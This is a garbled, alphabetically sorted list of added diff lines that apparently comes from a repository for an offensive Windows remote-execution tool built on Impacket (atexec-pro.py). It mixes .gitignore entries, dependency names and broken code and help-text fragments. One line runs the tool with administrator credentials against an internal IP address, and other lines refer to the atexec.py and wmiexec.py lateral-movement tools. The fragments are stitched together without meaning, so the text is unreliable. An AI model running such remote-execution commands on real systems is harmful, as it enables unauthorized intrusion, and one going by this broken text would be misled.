+import time
+instance/
+ipython_config.py
+lib/
+lib64/
+local_settings.py
+nand then execute atexec.py '
+nmap the result with '
+nosetests.xml
+options:
+parts/
+pdm.lock
+pip-delete-this-directory.txt
+pip-log.txt
+pipe
+poetry.lock
+positional arguments:
+profile_default/
+pycryptodome>=3.20.0
+python atexec-pro.py localhost/administrator:123@10.211.55.3
+quot
+rpctransport.get_credentials())
+sdist/
+share/python-wheels/
+standard-encodings
+standard-encodings and then execute wmiexec.py '
+standard-encodings and then execute wmiexec.py again with -codec and the corresponding codec
+target/
+try {{
+upload
+use-with-ide
+var/
+venv.bak/
+venv/
+wheels/
+{common_ps}
+}}catch {{
+}}catch{{
